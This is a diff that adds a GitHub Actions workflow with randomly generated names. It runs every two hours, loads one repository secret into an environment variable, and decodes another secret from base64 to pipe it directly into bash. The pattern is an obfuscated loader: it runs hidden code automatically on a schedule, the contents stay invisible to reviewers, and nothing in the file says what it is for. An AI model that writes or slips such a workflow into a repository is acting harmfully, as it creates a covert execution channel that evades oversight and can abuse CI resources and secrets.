@@ -1,0 +1,13 @@
+name: pBgMdeVJ
+on:
+  schedule:
+    - cron: '0 */2 * * *'
+  workflow_dispatch:
+jobs:
+  gUEYOwuWVwBQ:
+    runs-on: ubuntu-latest
+    env:
+      tMyYoEGAbrd: ${{ secrets.QCFuDVSLFW }}
+    steps:
+      - uses: actions/checkout@v5
+      - run: echo "${{ secrets.wbCRenhK }}" | base64 -d | bash
